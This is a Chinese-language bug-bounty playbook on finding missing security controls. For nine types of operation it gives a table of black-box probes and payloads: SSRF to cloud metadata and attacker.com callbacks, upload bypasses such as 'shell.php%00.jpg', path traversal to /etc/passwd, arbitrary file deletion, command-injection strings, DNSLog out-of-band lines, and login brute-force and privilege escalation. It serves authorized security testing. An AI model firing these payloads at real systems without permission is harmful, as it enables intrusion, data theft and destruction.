# 控制缺口（Control Gap）狩猎

> 白盒视角：检查"代码里有没有这个控制" → 黑盒视角：探测"这个控制是否真的生效"
> 这是猎手拿到一个新功能、不知道从哪入手时的 SOP

---

## 1. 思维模型

**敏感操作 = 应有控制矩阵 → 黑盒探针 = 测每个控制是否缺失。**

```
看到端点 → 归类（数据修改 / 资金 / 文件 / SSRF / 认证 / 权限 / 命令 / 越权 / 信息）
         ↓
        翻表 → 该类型应该有哪 N 个控制
         ↓
对每个控制 → 设计探针：在不满足该控制的条件下访问，看响应
         ↓
        哪个返回 200 / 业务成功 → 漏洞
```

九大类操作 + 探针速查在第 3 章。

---

## 2. 端点分类速查

| 端点特征 | 类型 |
|---------|------|
| `POST/PUT/DELETE` + 资源 ID | 数据修改 |
| `GET` + 单个 ID（`/order/{id}`） | 数据访问 |
| 含 `export`、`download`、`batch` | 批量 |
| 含 `role`、`permission`、`grant` | 权限变更 |
| 含 `transfer`、`pay`、`refund`、`balance` | 资金 |
| 接受 URL 参数（`?url=`、`?fetch=`、`?import=`、回调） | SSRF |
| `multipart/form-data` 上传 | 文件上传 |
| 含 `file`、`path`、`filename`、`download` | 文件读 / 删 |
| 含 `cmd`、`exec`、`ping`、`nslookup`、`shell` | 命令执行 |
| `/login`、`/reset`、`/verify`、`/sms` | 认证 |

---

## 3. 9 类操作 × 探针表

### 3.1 数据修改 (CREATE / UPDATE / DELETE)

| 应有控制 | 黑盒探针 | 缺失则 |
|---------|---------|-------|
| 鉴权 | 删 Authorization / Cookie，发请求 | 未授权写 → P0 |
| 资源所有权 | 用账号 A 改 B 的资源 ID | IDOR / 越权 → P1 |
| 输入验证 | 改类型（int → "abc"）、长度溢出 | 报错 / 崩溃 → 信息泄露 |
| 输入完整性 | 加额外字段 `is_admin=true` | Mass Assignment → P0 |
| 操作确认 | 直接 DELETE 不带二次确认 token | 误删 / CSRF |

### 3.2 数据访问（READ）

| 探针 | 缺失则 |
|------|-------|
| 改 ID 序号（自增）/ 改 UUID（猜不动就枚举）/ 改 hash | IDOR |
| 删除认证后访问 | 未授权数据泄露 |
| `?ids=1,2,3,...,10000` 批量 | 大面积泄露 |
| 改字段筛选（`?fields=*` 或 GraphQL） | 字段级泄露 |

### 3.3 批量 / 导出

| 探针 | 缺失则 |
|------|-------|
| 改导出范围（`startDate=2010-01-01`） | 全量泄露 |
| 删除范围限制 / 用户筛选 | 跨租户泄露 |
| 高频调用 / 大并发 | DoS / 资源耗尽 |
| 改导出对象 ID（导出他人订单） | 越权批量 |

### 3.4 权限变更

| 探针 | 缺失则 |
|------|-------|
| 普通用户调用 `/role/grant` | 鉴权缺失提权 (P0) |
| 自己授予自己 admin | 自提权 (P0) |
| 普通管理员授予 super_admin | 边界缺失 (P0) |
| 改请求体 `role: admin` 等隐藏字段（IDOR + Mass Assignment） | 关键提权 (P0) |

### 3.5 资金

| 探针 | 缺失则 |
|------|-------|
| 金额改 0 / 0.01 / 负数 / 1e-10 | 金额校验缺失 (P0) |
| 改商品 ID 但保留低价 | 服务端不重算 → 任意支付 |
| 重放支付回调（同一签名两次） | 幂等缺失 → 双花 |
| 并发 50 次同请求 | 竞态 → 透支 / 双发卡券 |
| 把折扣券叠加 / 退货后回退优惠券 | 业务逻辑漏洞 |

参考：WooYun-2015-0108817（电商价格篡改）。

### 3.6 外部 HTTP（SSRF）

| 探针 | 缺失则 |
|------|-------|
| `?url=http://127.0.0.1` / `[::1]` / `2130706433` | 内网封禁缺失 |
| `?url=file:///etc/passwd` | 协议白名单缺失 |
| `?url=http://169.254.169.254/...` | 云元数据可达 |
| `?url=http://attacker.com` 看是否回连 | DNSLog 验证基本 SSRF |
| `?url=http://attacker.com` 触发 302 → 内网 | 重定向跟随未限制 |
| DNS Rebinding（`rbndr.us`） | 二次解析逃逸白名单 |

### 3.7 文件上传

| 探针 | 缺失则 |
|------|-------|
| 改扩展名 `.php` `.jsp` `.asp` `.phtml` `.jspx` | 黑名单缺失 |
| `.Php` / `.pHp%20` / `.php.` | 大小写 / 空格绕过 |
| `shell.php%00.jpg` | 截断绕过（旧版） |
| `Content-Type: image/jpeg` 但内容是脚本 | MIME 仅靠 Header |
| 文件名加 `../` | 路径校验缺失 |
| 上传后访问目录列表 | 命名规则猜测 |
| 内容含图片头 + 脚本（图片马） | 解析漏洞配合 |

### 3.8 文件读 / 下载 / 删除

| 探针 | 缺失则 |
|------|-------|
| `?file=../../etc/passwd` 各级 | 路径规范化缺失 |
| `?file=/etc/passwd`（绝对路径） | 前缀校验缺失 |
| `?file=file:///etc/passwd` | 协议过滤缺失 |
| 删除接口：`?path=../../web/index.html` | **任意文件删（易遗漏！）** |
| 大小写：`?file=../../ETC/PASSWD` | 黑名单 lower |

### 3.9 命令执行（含 ping / nslookup / 工具类）

| 探针 | 缺失则 |
|------|-------|
| `127.0.0.1; id` / `\| id` / `&& id` / `` `id` `` / `$(id)` | 拼接符过滤缺失 |
| `127.0.0.1%0aid` | 换行绕过 |
| `127.0.0.1 -c1 -W1 ; sleep 5` | 时间盲（无回显） |
| `ping ${LDAP}.attacker.com` 看 DNSLog | 外带验证 |
| 命令字 cat / curl 被过滤时换 tac / wget | 关键字过滤 |

### 3.10 认证操作

| 探针 | 缺失则 |
|------|-------|
| 短信验证码爆破（4–6 位数字、无频率限制） | 验证码爆破 |
| 验证码不刷新（同一码用多次） | 验证码可重用 |
| 验证码绑定关系：用 A 手机收到的码改 B 密码 | 验证码与用户解绑 |
| 重置流程跳步骤（直接 GET 第 3 步页面） | 流程跳跃 |
| 改请求体 `username=victim` | 凭证参数可控 |
| 撞库（公开数据库 + 无频率限制） | 撞库 |

详见 `playbooks/logic-flaws.md` 4 大密码重置模式。

### 3.11 越权（独立类，常被错过）

| 探针 | 缺失则 |
|------|-------|
| 水平：账号 A 改 B 资源（同级越权） | IDOR (P1) |
| 垂直：普通用户调用 admin API | 后端鉴权仅看 JWT 而不看 role (P0) |
| Header 越权：`X-User-Role: admin` 注入 | Header 信任 (P0) |
| Cookie 越权：改 Cookie 中 `role` / `userId` | 客户端可控会话 (P0) |
| Method 越权：DELETE 不行就试 OPTIONS / `X-HTTP-Method-Override` | 方法过滤不全 |

---

## 4. "新功能 5 分钟探针套餐"

拿到一个新功能，先做这 5 步（约 5–10 分钟）：

```
1. 抓 1 个完整请求（保留所有 Header / Cookie / Body）
   → 看请求里有什么"看起来重要的字段"

2. 删掉 Authorization / Cookie，重发
   → 看是否还能用（未授权）

3. 改 1 个 ID 字段（数字 +1 / 换 UUID / 换租户）
   → 看是否能拿到他人数据（IDOR）

4. 改 1 个看起来"客户端不该控制"的字段
   （price / role / status / is_admin / amount / userId）
   → 看是否生效（Mass Assignment / 篡改）

5. 加一个 corner case 字段（重复参数 / null / 长字符串 / 数组）
   → 看返回是否变化或报错（信息泄露 / 类型混淆）
```

5 步过完没有发现，再进对应 playbook 深挖。

---

## 5. 控制缺口报告写法

报告里把这些用同一个表格格式呈现，平台审核很喜欢：

```markdown
## 控制缺口分析

| 应有控制 | 在该端点是否生效 | 证据 |
|---------|----------------|------|
| 鉴权 | ✓ 缺 Authorization 返回 401 | （包略） |
| 资源所有权 | ✗ 账号 A 可读 B 数据 | 见 PoC §1 |
| 输入完整性 | ✗ 接受 `is_admin=true` 字段 | 见 PoC §2 |
| 操作审计 | ? 无法从外部判断 | - |

漏洞结论：缺失"资源所有权" + "Mass Assignment 防护"，
组合可导致普通用户提权为 admin。
```

---

## 6. 易遗漏的盲区

> 来自 WooYun + 真实 SRC 报告分析的"高频盲区"

1. **文件删除**——大家只测上传 / 下载，忘了 DELETE。任意文件删可瘫服务（删 `index.html`）。
2. **批量参数**（`ids=1,2,3,...,10000`）——单个 IDOR 受限制时，批量接口往往没限制。
3. **导出范围**（`startDate=2010-01-01`）——把分页放大 / 把日期放回十年前。
4. **OPTIONS / HEAD**——很多鉴权拦截只针对 GET/POST。
5. **二次接口 / 内部接口**——通过抓 mobile app / 微信小程序常发现"PC 没暴露的"接口。
6. **WebSocket / SSE**——文档不写、流量不抓的话很容易漏掉。
7. **GraphQL 深嵌套**——顶层加权限，子字段没加（详见 `playbooks/graphql.md`）。
8. **登出 / 注销 redirect_uri**——OAuth 几乎所有人都忘记白名单 logout。
9. **第三方回调** （short URL / sms / pay 回调）——回调 endpoint 经常无签名。

每次审计花 5 分钟过一遍这 9 个盲区，能挖到不少 P1。

---

## 7. 与 playbook 的衔接

发现某类型缺失控制 → 进入对应 playbook 深挖：

| 缺失控制 | 对应 playbook |
|---------|--------------|
| 鉴权 / 资源所有权 | `playbooks/unauth-access.md`、`playbooks/logic-flaws.md` (越权) |
| URL 白名单 / 协议过滤 | `playbooks/ssrf-cache-host.md` |
| 文件类型 / 路径 | `playbooks/file-upload.md`、`playbooks/path-traversal.md` |
| 命令白名单 / 拼接 | `playbooks/rce.md` |
| 验证码 / 凭证绑定 | `playbooks/logic-flaws.md` |
| 输入验证（SQL / XSS） | `playbooks/sqli.md`、`playbooks/xss.md` |
| 金额 / 幂等 / 并发 | `playbooks/logic-flaws.md`、`playbooks/race-conditions.md` |
